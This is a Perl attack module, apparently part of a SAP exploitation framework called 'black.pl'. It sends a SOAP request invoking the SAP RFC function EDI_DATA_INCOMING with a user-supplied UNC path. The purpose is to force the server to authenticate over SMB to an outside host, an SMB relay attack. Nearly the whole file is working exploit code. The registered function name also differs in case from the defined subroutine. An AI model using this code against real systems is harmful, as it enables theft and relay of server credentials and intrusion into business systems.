#!/usr/bin/perl
# Module SMB relay (EDI_DATA_INCOMING)

# CONFIG
######################
my $desc ="SMB relay  (EDI_DATA_INCOMING) \n\t Usage: black.pl .. .. -m id_module <path> [port]\n\t UNC path like this: \\\\192.168.0.101\n\tdefault port - SAPID3\n"; 
our $funcName="edi_smb_Relay_func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub edi_smb_relay_func()
{
	my $pport="SAPID3";
	my $path;
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
 <SOAP-ENV:Body>
  <m:EDI_DATA_INCOMING xmlns:m="urn:sap-com:document:sap:rfc:functions">
   <PATHNAME>%path%</PATHNAME>
   <PORT>%port%</PORT>
  </m:EDI_DATA_INCOMING>
 </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}
	
	if ($ARGV[$m_arg_i+2]){
		$pport=$ARGV[$m_arg_i+2];
		print $pport." - pport \n\n";
		}
	
	$XML=~s/%path%/$path/s;
	$XML=~s/%port%/$pport/s;
	
	#print "$XML\r\n";
	
	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);

	print "$answer\r\n";
	
	print "\n\n";

}